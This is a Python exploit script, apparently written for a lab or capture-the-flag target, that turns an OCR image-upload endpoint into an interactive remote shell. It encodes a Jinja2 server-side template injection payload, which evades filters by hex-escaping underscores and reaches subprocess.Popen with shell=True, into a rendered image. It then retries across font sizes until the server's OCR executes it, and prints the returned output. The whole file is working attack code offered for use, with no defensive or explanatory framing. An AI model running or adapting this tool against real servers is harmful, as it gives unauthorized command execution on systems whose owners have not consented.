#!/usr/bin/env python

from PIL import Image, ImageDraw, ImageFont
from math import ceil
import os
import requests
import io
from typing import Optional
import sys
from pprint import pprint
from halo import Halo
from colorama import Fore, Style

CMD_TEMPLATE = "request | attr(\"application\") | attr(\"\\x5f\\x5fglobals\\x5f\\x5f\") | attr(\"\\x5f\\x5fgetitem\\x5f\\x5f\")(\"\\x5f\\x5fbuiltins\\x5f\\x5f\") | attr(\"\\x5f\\x5fgetitem\\x5f\\x5f\")(\"\\x5f\\x5fimport\\x5f\\x5f\")(\"subprocess\") | attr(\"Popen\")(\"{}\", shell=True, stdout=-1) | attr(\"communicate\")()"

def text2image(
    text: str,
    size=12,
    format="jpeg",
    font="/usr/share/fonts/truetype/liberation/LiberationMono-Regular.ttf",
    path: Optional[str]=None,
) -> io.BytesIO:
    """Creates an image of the given text and returns it as BytesIO object.

    The image will have a white background and the text
    is black and in the middle.

    Args:
        text (str): The text which is in the image
        size (int): The font size
        format (str): The format of the saved image
        font (str): Path to the font to use
        path (str): If provided, the image will also be stored at
            that location. The file extension should correspond
            to the specified format.

    Returns:
        The image as an BytesIO object
    """

    # Import font
    font = ImageFont.truetype(font, size)

    # Calculate text size to determine size of image
    image_size = [sum(x) for x in zip(font.getsize(text), (ceil((8/52) * size), ceil((4/52) * size)))]

    # Create the image itsefl with a white background and the previously
    # calculate site according to the text size
    image = Image.new(mode = "RGB", size=image_size, color="white")

    # Get the draw instance
    draw = ImageDraw.Draw(image)

    # Draw the text onto the image.
    # The text is slightly shifted to the right to avoid the text
    # being right on the left image edge
    draw.text(((8 / 52) * size, 0), text, font=font, fill="black")

    image_bytes = io.BytesIO()
    image.save(image_bytes, format=format)

    # If path is not none, store the image additionally at the given path
    if path is not None:
        image.save(path, format=format)

    return image_bytes

def prepare_cmd(cmd: str):
    converted_cmd = cmd.replace("_", "\\x5f")

    prepared_cmd = CMD_TEMPLATE.format(converted_cmd)

    return "{{ " + prepared_cmd + " }}"


def send_cmd(
    cmd: str,
    url: str,
) -> str:
    """Send a command to the given url by converting it into a payload file."""
    spinner = Halo(text="Loading", spinner="dots")
    spinner.start()
    # Variable to store the command output
    cmd_response = None

    prepared_cmd = prepare_cmd(cmd)

    # The ocr on the server can be a bit finicky.
    # To combat this, we will try different font sizes and stop on two conditions
    #   1. We get a non-error response
    #   2. The font size is bigger than our defined maximum
    # We start at the minimum and try each font size until
    # we reach the maximum
    min_font_size = 20
    max_font_size = 100

    for size in range(min_font_size, max_font_size):
        count = size - min_font_size 

        spinner.text = f"Loading (Tries: {count}/{max_font_size - min_font_size})"

        # Prepare payload by converting the text into an image
        payload = text2image(text=prepared_cmd, path=f"/tmp/try-{size}.jpg", size=size).getvalue()

        # Send the payload
        response = requests.post(url, files={"file": ("payload.jpg", payload)})

        # Check if response is ok
        if "Error occured while processing the image" not in response.text:
            cmd_response = response.text
            break

    if cmd_response is None:
        spinner.fail("Could not execute the command")
        return None

    # The response is always enclosed in an html paragraph, remove the html tags
    cmd_output = cmd_response[3:-5]

    spinner.stop()
    return cmd_output

def parse_output(output: str) -> str:
    """Parses an output from the server
    """
    split_output = output[1:-1].replace("\\n", "\n").split(",")
    stdout = split_output[0].strip()
    stderr = split_output[1].strip()

    if stdout != "None":
        stdout = stdout[6:-6]
    if stderr != "None":
        stderr = stderr[6:-6]
        return stderr

    return stdout


def main(url=str):
    """Main method. Runs the cli loop"""

    # Print welcoming message
    print(f"""
 ▄▄▄     ▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄    ▄▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄▄▄▄▄ ▄▄▄     ▄▄▄     
█   █   █      █       █       █  █       █  █ █  █       █   █   █   █    
█   █   █  ▄   █▄     ▄█    ▄▄▄█  █  ▄▄▄▄▄█  █▄█  █    ▄▄▄█   █   █   █    
█   █   █ █▄█  █ █   █ █   █▄▄▄   █ █▄▄▄▄▄█       █   █▄▄▄█   █   █   █    
█   █▄▄▄█      █ █   █ █    ▄▄▄█  █▄▄▄▄▄  █   ▄   █    ▄▄▄█   █▄▄▄█   █▄▄▄ 
█       █  ▄   █ █   █ █   █▄▄▄    ▄▄▄▄▄█ █  █ █  █   █▄▄▄█       █       █
█▄▄▄▄▄▄▄█▄█ █▄▄█ █▄▄▄█ █▄▄▄▄▄▄▄█  █▄▄▄▄▄▄▄█▄▄█ █▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█

Remote shell for {Fore.BLUE}{url}{Style.RESET_ALL}
Enter your command or type {Fore.RED}exit{Style.RESET_ALL} to exit the shell""")

    # CLI loop
    # First prompt an input from the user. Then check if they typed
    # exit. If yes, exit the program. If not, send the command.
    while True:
        user_input = str(input("\n$ "))

        if not user_input:
            continue

        if user_input == "exit":
            return

        output = send_cmd(user_input, url=url)

        if output is not None:
            print(parse_output(output))


if __name__ == "__main__":
    url = sys.argv[1]

    main(url)
